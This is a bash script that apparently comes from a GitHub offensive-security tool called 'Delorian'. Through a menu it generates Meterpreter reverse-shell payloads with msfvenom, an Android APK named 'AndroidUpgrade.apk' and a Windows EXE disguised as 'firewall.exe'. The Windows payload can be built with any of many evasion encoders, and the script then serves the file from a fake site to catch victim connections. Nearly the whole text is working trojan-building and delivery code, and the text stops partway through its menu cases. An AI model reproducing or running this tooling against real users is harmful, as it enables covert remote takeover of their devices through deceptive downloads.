#!/bin/bash 
clear
echo ""
#setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___   "
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo ""
setterm -foreground white
echo "           (1)Windows  - (2) Android - (0) Exit          "
echo ""
read -p " Delorian > " delorian
case $delorian in
2)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
echo "                 payload editing:  "
echo ""
read -p $"   Lhost: " lhost
read -p $"   Lport: " lport
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $PREFIX/share/d/android/AndroidUpgrade.apk
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
cd $PREFIX/share/d/android/website
setterm -foreground green
echo ""
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000$PREFIX/usr/delorian/android/sitio/upgradeandroid.html"
echo "  virus $PREFIX/usr/delorian/android/AndroidUpgrade.apk"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
echo ""
setterm -foreground white
python -m http.server --cgi
rm -rf $PREFIX/usr/delorian/android/AndroidUpgrade.apk
;;
1)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|   \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
echo "                 payload editing:  

   01| x86/shikata_ga_nai     10| x86/jmp_call_additive   19| x86/avoid_utf8_tolower   
   02| x85/xor_dynamic        11| x86/fnstenv_mov         20| x86/avoid_underscore_tolower 
   03| x86/unicode_upper      12| x86/countdown           21| x86/alpha_upper 
   04| x86/unicode_mixed      13| x86/context_time        22| x86/alpha_mixed
   05| x86/single_static_bit  14| x86/context_start       23| x86/add_sub
   06| x86/service            15| x86/context_cpuid       24| x64/zutto_dekiru
   07| x86/opt_sub            16| x86/call4_dword_xor     25| x64/xor_dynamic
   08| x86/nonupper           17| x86/bmp_polyglot        26| x64/xor_context
   09| x86/nonalpha           18| x86/bloxor              27| x64/xor
   "
;;
esac
read -p "   Delorian > " payload
case $payload in
01)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   Lhost: " lhost
read -p $"   Lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo ""
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
echo ""
xterm -e "python -m SimpleHTTPServer"
rm -rf /usr/delorian/windows/firewall.exe
;;
02)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   Lhost: " lhost
read -p $"   Lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer" 
;;
03)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/unicode_upper -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer" 
;;
04)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/unicode_mixed  -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
05)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/single_static_bit  -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
06)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/service  -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
07)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/opt_sub -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
08)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/nonupper -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
09)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/nonalpha -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
10)
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/jmp_call_additive -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer" 
;;
11)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/fnstenv_mov -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
12)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/countdown -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer" 
;;
13)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/context_time -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
14)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/context_stat -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
15)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/context_cpuid -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
16)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/call4_dword_xor -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
17)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/bmp_polyglot -f exe > /usr/delorian/windows/firewall.exe 
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
18)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/bloxor -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
19)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/avoid_utf8_tolower -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
20)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/avoid_underscore_tolower -f exe > /usr/delorian/windows/firewall.exe 
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
21)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/alpha_upper -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
22)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/alpha_mixed -f exe > /usr/delorian/windows/firewall.exe 
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
23)
clear
echo ""
